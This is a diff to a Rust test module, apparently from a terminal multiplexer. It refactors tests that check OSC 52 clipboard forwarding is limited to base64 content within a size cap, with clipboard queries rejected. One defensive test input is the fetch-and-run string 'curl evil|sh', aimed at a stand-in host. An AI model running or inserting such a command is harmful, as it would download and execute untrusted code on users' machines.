@@ -1633,19 +1633,10 @@ mod tests {
         }
     }
 
-    /// A new clipboard reaches the terminal once, and only when clipboard writes are on, as base64
-    /// within the cap: never raw shell injection, a query (`OSC 52 ; c ; ?`, which would ask the
-    /// user's terminal for their clipboard), or an oversized payload.
-    #[test]
-    fn only_a_base64_clipboard_is_forwarded_and_only_when_on() {
-        let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
-        for (on, clipboard, forwarded) in [
-            (false, "aGVsbG8=", false),
-            (true, "aGVsbG8=", true),
-            (true, "curl evil|sh", false),
-            (true, "?", false),
-            (true, &huge, false),
-        ] {
+    /// Whether each clipboard, new to a terminal with clipboard writes `on`, reaches it: once,
+    /// and never again while it stays the same.
+    fn forwards_clipboard(cases: &[(bool, &str, bool)]) {
+        for &(on, clipboard, forwarded) in cases {
             let mut oob = OutOfBand::default().with_clipboard(on);
             oob.prime(win("", "", "", 0));
             let scr = screen_of(b"");
@@ -1653,10 +1644,38 @@ mod tests {
             let osc = format!("\x1b]52;c;{clipboard}\x07");
             assert_eq!(out.contains("\x1b]52;"), forwarded, "{on} {out:?}");
             assert_eq!(out.contains(&osc), forwarded, "{on} {out:?}");
-            // The same clipboard again is not re-emitted.
             let again = oob_emit(&mut oob, &scr, win("", "", clipboard, 0));
             assert!(!again.contains("\x1b]52;"), "{again:?}");
         }
+    }
+
+    #[test]
+    fn out_of_band_clipboard_off_emits_nothing() {
+        forwards_clipboard(&[(false, "aGVsbG8=", false), (true, "aGVsbG8=", true)]);
+    }
+
+    /// Never raw shell injection.
+    #[test]
+    fn out_of_band_rejects_non_base64_clipboard_even_when_on() {
+        forwards_clipboard(&[(true, "curl evil|sh", false)]);
+    }
+
+    /// Nor a query (`OSC 52 ; c ; ?`, which would ask the user's terminal for their clipboard), nor
+    /// a payload over the cap.
+    #[test]
+    fn a_clipboard_query_or_an_oversized_payload_is_never_forwarded() {
+        let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
+        forwards_clipboard(&[(true, "?", false), (true, &huge, false)]);
+    }
+
+    /// A program turning the mouse on has the real terminal report it, in SGR.
+    #[test]
+    fn out_of_band_reasserts_input_modes_on_change() {
+        let mut oob = OutOfBand::default();
+        oob_emit(&mut oob, &screen_of(b""), win("", "", "", 0));
+        let modes = screen_of(b"\x1b[?2004h\x1b[?1000h\x1b[?1005h");
+        let buf = oob_emit(&mut oob, &modes, win("", "", "", 0));
+        assert_eq!(buf, "\x1b[?1000h\x1b[?1006h");
     }
 
     /// What the first frame shows of the clipboard and bell was there before the client came, and
